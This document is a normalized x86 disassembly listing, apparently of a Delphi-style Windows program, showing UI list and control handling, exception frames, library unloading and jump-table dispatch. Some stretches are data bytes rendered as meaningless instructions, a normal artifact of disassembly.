mov edx eax
mov eax [ ebx + 0x14 ]
call sub_41cc90
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_41d070
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_41cc90
mov eax [ ebp - 0x1c ]
add eax 0x5
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x23c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x28 ]
mov eax ebx
call sub_41d3ac
mov edx [ ebp - 0x8 ]
sub edx [ ebp - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov edx [ esi + 0x2a0 ]
mov eax [ ebx + 0x14 ]
call sub_41cc90
add edx [ ebp - 0x10 ]
push edx
lea ecx [ ebp - 0x2c ]
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x23c ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x2c ]
push eax
mov ecx [ ebp - 0x14 ]
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_41d2ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b035
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_403f80
retn
adc edx 0x0
sub_42b058
push ebx
mov ebx eax
mov eax ebx
call sub_4426d0
test al al
je r-xdata
mov eax [ ebx + 0x2a4 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
mov eax 0xff000000
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax ebx
call sub_42b040
jmp r-xdata
pop ebx
retn
sub_42b0b0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_433f98
test [ ebx + 0x298 ] 0x20
je r-xdata
pop esi
pop ebx
retn
cmp [ esi ] 0xd
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
test eax eax
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x11c ]
test al al
je r-xdata
mov [ esi ] 0x0
cmp [ ebx + 0x222 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x224 ]
call [ ebx + 0x220 ]
sub_42b124
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42b200
push [ fs : eax ]
mov [ fs : eax ] esp
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_426320
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42b1e3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x23c ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x18 ]
call sub_41bfbc
mov esi eax
mov eax [ ebp - 0x8 ]
mov [ eax + 0x58 ] esi
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
lea edx [ ebp - 0x14 ]
xor ecx ecx
mov eax r-xdata
call sub_408b70
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x3c ]
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b1ea
mov eax [ ebp - 0x8 ]
call sub_403224
retn
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x58 ]
mov eax [ ebx + 0x23c ]
xor edx edx
mov esi [ eax ]
call [ esi + 0x24 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42b224
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
sub ebx esi
jg r-xdata
pop esi
pop ebx
pop ebp
retn
dec ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x23c ]
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
dec esi
inc ebx
jne r-xdata
sub_42b250
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x23c ]
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x5c ]
cmp eax 0xffffffff
je r-xdata
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x23c ]
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_42b280
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42b436
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4426d0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x299 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b43d
lea eax [ ebp - 0x8 ]
call sub_403f5c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_414368
xor eax eax
push ebp
push sub_42b40f
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov eax [ ebp - 0x4 ]
test [ eax + 0x298 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x2a4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x4 ]
push eax
push r-xdata
call sub_41bff0
mov eax [ ebp - 0x4 ]
test [ eax + 0x298 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x298 ] 0x10
jne r-xdata
push ebp
mov eax 0x1fffffff
call sub_42b250
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x298 ] 0x4
jne r-xdata
push ebp
mov eax 0x20000000
call sub_42b250
pop ecx
mov eax [ ebp - 0x4 ]
test [ eax + 0x298 ] 0x2
jne r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx eax
dec edx
mov eax 0x14
call sub_42b224
pop ecx
mov eax [ ebp - 0x4 ]
test [ eax + 0x298 ] 0x1
jne r-xdata
push ebp
mov edx 0x13
mov eax 0x10
call sub_42b224
pop ecx
mov eax [ ebp - 0x4 ]
test [ eax + 0x298 ] 0x20
je r-xdata
push ebp
mov edx 0xf
xor eax eax
call sub_42b224
pop ecx
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_42b4b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_414424
mov eax [ ebp - 0x4 ]
mov [ eax + 0x299 ] 0x0
retn
push esi
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
xor edx edx
mov ebx [ eax ]
call [ ebx + 0x64 ]
sub_42b444
push ebx
mov ebx eax
cmp [ ebx + 0x29a ] 0x0
je r-xdata
mov eax ebx
call sub_4338c4
mov [ ebx + 0x29a ] 0x0
test [ ebx + 0x298 ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
test eax eax
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x11c ]
test al al
je r-xdata
pop ebx
retn
sub_42b4b0
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_4426d0
test al al
je r-xdata
mov [ ebx + 0x2a4 ] esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
test [ ebx + 0x298 ] 0x20
je r-xdata
test [ ebx + 0x298 ] 0x20
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
test edi edi
jne r-xdata
cmp esi 0xff000000
je r-xdata
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jle r-xdata
mov ecx esi
xor edx edx
mov eax [ ebx + 0x23c ]
mov edi [ eax ]
call [ edi + 0x24 ]
xor edi edi
jmp r-xdata
mov [ esp ] eax
mov ebp 0x1
inc ebp
dec [ esp ]
jne r-xdata
mov edi ebp
jmp r-xdata
mov edx ebp
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp eax esi
jne r-xdata
sub_42b558
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x298 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x298 ] al
mov al [ ebx + 0x298 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
setne dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax ebx
call sub_42b280
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
jne r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_42b5c9
add [ eax ] al
add [ edi ] ch
add [ eax ] al
add [ ecx + edi ] bh
add [ eax ] al
das
inc edx
add ah ch
cmp [ esi ] al
jo r-xdata
inc esi
add al al
lodsb [ esi ]
inc edx
add [ ecx + edi ] dh
inc esi
add [ eax + 0x2c0042ac ] bh
cmp [ esi ] eax
mov al 0xac
inc edx
add [ ecx + edi ] ah
inc esi
add [ eax + 0x1c0042ac ] ch
cmp [ esi ] eax
mov al [ 0x140042ac ]
cmp [ esi ] eax
cwde
lodsb [ esi ]
inc edx
add [ ecx + edi ] cl
inc esi
add [ eax + 0x40042ac ] dl
cmp [ esi ] eax
mov [ edx + eax * 2 + 0x4638fc00 ] ch
add [ eax - 0xbffbd54 ] al
cmp [ esi ] al
js r-xdata
inc edx
add ah ah
cmp [ esi ] al
push 0xdc0042ac
cmp [ esi ] al
pushad
lodsb [ esi ]
inc edx
add ah dl
cmp [ esi ] al
pop eax
lodsb [ esi ]
inc edx
add ah cl
cmp [ esi ] al
push eax
lodsb [ esi ]
inc edx
add ah al
cmp [ esi ] al
dec eax
lodsb [ esi ]
inc edx
add [ eax + edi - 0x53bfffba ] bh
inc edx
add [ eax + edi - 0x53c7ffba ] dh
inc edx
add [ eax + edi - 0x53cfffba ] ch
inc edx
add [ eax + edi - 0x53d7ffba ] ah
inc edx
add [ eax + edi - 0x53dfffba ] bl
inc edx
add [ eax + edi - 0x53e7ffba ] dl
inc edx
add [ eax + edi - 0x53efffba ] cl
inc edx
add [ eax + edi - 0x53f7ffba ] al
inc edx
add [ eax + edi + 0x46 ] bh
add [ eax ] al
lodsb [ esi ]
inc edx
add [ eax + edi + 0x46 ] dh
add al bh
stosd [ edi ]
inc edx
add [ eax + edi + 0x46 ] ch
add al dh
stosd [ edi ]
inc edx
add [ eax + edi + 0x46 ] ah
add al ch
stosd [ edi ]
inc edx
add [ eax + edi + 0x46 ] bl
add al ah
stosd [ edi ]
inc edx
add [ eax + edi + 0x46 ] dl
add al bl
stosd [ edi ]
inc edx
add [ eax + edi + 0x46 ] cl
add al dl
stosd [ edi ]
inc edx
add [ eax + edi + 0x46 ] al
add al cl
stosd [ edi ]
inc edx
add [ eax + edi ] bh
inc esi
add al al
stosd [ edi ]
inc edx
add [ eax + edi ] dh
inc esi
add [ eax + 0x2c0042ab ] bh
cmp [ esi ] al
mov al 0xab
inc edx
add [ eax + edi ] ah
inc esi
add [ eax + 0x1c0042ab ] ch
cmp [ esi ] al
mov al [ 0x140042ab ]
cmp [ esi ] al
cwde
stosd [ edi ]
inc edx
add [ eax + edi ] cl
inc esi
add [ eax + 0x40042ab ] dl
cmp [ esi ] al
mov [ ebx + 0x37fc0042 ] ch
inc esi
add [ eax - 0xbffbd55 ] al
aaa
inc esi
add [ eax - 0x55 ] bh
inc edx
add ah ch
aaa
inc esi
add [ eax - 0x55 ] dh
inc edx
add ah ah
aaa
inc esi
add [ eax - 0x55 ] ch
inc edx
add ah bl
aaa
inc esi
add [ eax - 0x55 ] ah
inc edx
add ah dl
aaa
inc esi
add [ eax - 0x55 ] bl
inc edx
add ah cl
aaa
inc esi
add [ eax - 0x55 ] dl
inc edx
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42b784
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b78b
mov eax rw-data
mov ecx 0x2f
mov edx [ r-xdata ]
call sub_4049d8
sub_42b7c0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b7e5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b7ec
retn
sub_42b7f8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b829
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b830
retn
mov eax [ rw-data ]
call sub_403224
sub_42b8e0
or al [ eax ]
add [ eax ] al
push 0x4639
inc eax
inc esi
add [ eax ] al
add [ eax ] al
add [ ecx + edi + 0x46 ] ah
add al ch
inc esi
add [ eax ] al
add [ eax ] al
add [ eax + 0x39 ] ah
inc esi
add [ esi + edi + 0x46 ] dl
add [ eax ] al
pop esp
cmp [ esi ] eax
aas
inc esi
add [ eax ] al
add [ eax ] al
add [ eax + 0x39 ] bl
inc esi
add [ eax + eax * 2 ] ch
inc esi
add [ eax ] al
add [ eax ] al
add [ ecx + edi + 0x46 ] dl
add [ edx + eax * 2 ] ah
inc esi
add [ eax ] al
add [ eax ] al
add [ eax + 0x39 ] dl
inc esi
add [ eax + 0x40 ] ah
inc esi
add [ eax ] al
add [ eax ] al
add [ ecx + edi + 0x46 ] cl
add ah bl
inc eax
inc esi
add [ eax ] al
add [ eax ] al
add [ eax + 0x39 ] cl
inc esi
add [ edx + eax * 2 ] cl
inc esi
add [ eax ] al
add [ eax ] al
add [ ecx + edi + 0x46 ] al
add [ esi + edi + 0x46 ] dh
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b988
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b98f
retn
call sub_42b8c4
sub_42b9bc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b9e1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b9e8
retn
sub_42ba03
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42ba48
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ba4f
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_4049d8
sub_42ba6b
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42bab0
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bab7
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_4049d8
sub_42bac7
dec [ edx ]
add [ eax ] al
add [ ebp + 0x41 ] cl
push eax
dec ecx
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42bb1d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bb24
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_403f5c
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42bb30
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42bb74
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bb7b
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42bb88
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42bbad
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bbb4
retn
sub_42bbc0
or al 0xbc
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edi * 4 ] dl
inc edx
add [ eax + eax ] al
add [ eax ] al
mov al [ 0x54004010 ]
xor al 0x40
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ edx + esi ] dl
inc eax
add [ eax - 0x53ffbd44 ] bl
mov esp 0x540b0042
inc ebx
outsd
outsb
jbe r-xdata
jb r-xdata
insb
imul ebp [ edi + 0x6e ] r-xdata
push cs
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
jbe r-xdata
insb
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
insb
jb r-xdata
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
imul ebp [ edi + 0x6e ] 0x6d726f46
popad
je r-xdata
add [ eax ] al
add [ eax - 0x1 ] dl
add eax [ eax ]
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
nop
push sub_42bd2f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
add bh bh
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bd36
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_40498c
mov eax rw-data
mov edx [ r-xdata ]
call sub_40498c
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42bcc0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42bd2f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bd36
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_40498c
mov eax rw-data
mov edx [ r-xdata ]
call sub_40498c
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42bf88
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
call sub_424f6c
mov [ esi + 0x5 ] al
call sub_42bc60
cmp eax 0x60000
setge al
mov [ esi + 0x4 ] al
mov eax esi
call sub_42c7cc
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax esi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_42bfd4
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
mov eax esi
call sub_42c074
call sub_424dac
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403214
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_42c008
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp [ esi + 0x6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ esi + eax * 4 + 0x8 ]
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al bl
cmp [ esi + eax * 4 + 0x8 ] 0x0
jne r-xdata
mov edi ebx
and edi 0x7f
mov eax [ edi * 4 + rw-data ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esi + edi * 4 + 0x8 ] eax
sub_42c074
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
inc ebx
cmp bl 0x18
jne r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
mov [ esi + edi * 4 + 0x8 ] eax
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_42c0b8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_42c008
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_42c104
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_42c008
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42c148
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x10 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov al 0x1
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov dl [ ebx ]
mov eax esi
call sub_42c008
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
test al al
je r-xdata
sub_42c1b0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov ebx eax
mov esi [ ebp + 0x14 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax esi
call sub_4047a8
push eax
mov eax esi
call sub_404798
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push edi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_42c008
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_42c214
mov [ ecx ] 0x0
xor eax eax
mov al dl
cmp eax 0xf
jge r-xdata
add eax 0xfffffff1
sub eax 0xc
jb r-xdata
add eax 0xfffffffe
sub eax 0x5
jb r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xf
jmp r-xdata
sub eax 0x2
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x8
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x4
mov eax 0x1b
jmp r-xdata
je r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x7
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0x1d
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_42c298
mov [ ecx ] 0x3
mov eax edx
add al 0xfe
sub al 0x7
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x9
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_42c2d4
mov [ ecx ] 0x17
xor eax eax
mov al dl
cmp eax 0x68
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
mov al [ eax + lookup_table_42c2f1 ]
jmp [ eax * 4 + jump_table_42c35a ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xb
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x14
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x1a
jmp r-xdata
mov [ ecx + 0x4 ] 0xb
mov eax 0x1c
jmp r-xdata
mov [ ecx + 0x4 ] 0xc
mov eax 0x1e
jmp r-xdata
mov [ ecx + 0x4 ] 0xd
mov eax 0x20
jmp r-xdata
mov [ ecx + 0x4 ] 0xe
mov eax 0x24
jmp r-xdata
mov [ ecx + 0x4 ] 0xf
mov eax 0x28
jmp r-xdata
mov [ ecx + 0x4 ] 0x10
mov eax 0x2c
jmp r-xdata
mov [ ecx + 0x4 ] 0x11
mov eax 0x30
jmp r-xdata
mov [ ecx + 0x4 ] 0x12
mov eax 0x34
jmp r-xdata
mov [ ecx + 0x4 ] 0x13
mov eax 0x38
jmp r-xdata
mov [ ecx + 0x4 ] 0x14
mov eax 0x3c
jmp r-xdata
mov [ ecx + 0x4 ] 0x15
mov eax 0x40
jmp r-xdata
mov [ ecx + 0x4 ] 0x16
mov eax 0x44
jmp r-xdata
mov [ ecx + 0x4 ] 0x17
mov eax 0x48
jmp r-xdata
mov [ ecx + 0x4 ] 0x18
mov eax 0x4c
jmp r-xdata
mov [ ecx + 0x4 ] 0x19
mov eax 0x50
jmp r-xdata
mov [ ecx + 0x4 ] 0x1a
mov eax 0x54
jmp r-xdata
mov [ ecx + 0x4 ] 0x1b
mov eax 0x58
jmp r-xdata
mov [ ecx + 0x4 ] 0x1c
mov eax 0x5c
jmp r-xdata
mov [ ecx + 0x4 ] 0x1d
mov eax 0x60
jmp r-xdata
mov [ ecx + 0x4 ] 0x1e
mov eax 0x61
jmp r-xdata
mov [ ecx + 0x4 ] 0x1f
mov eax 0x62
jmp r-xdata
mov [ ecx + 0x4 ] 0x20
mov eax 0x63
jmp r-xdata
mov [ ecx + 0x4 ] 0x21
mov eax 0x64
jmp r-xdata
mov [ ecx + 0x4 ] 0x22
mov eax 0x65
jmp r-xdata
mov [ ecx + 0x4 ] 0x23
mov eax 0x66
jmp r-xdata
mov [ ecx + 0x4 ] 0x24
mov eax 0x67
jmp r-xdata
mov [ ecx + 0x4 ] 0x25
mov eax 0x68
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_42c660
push ebp
mov ebp esp
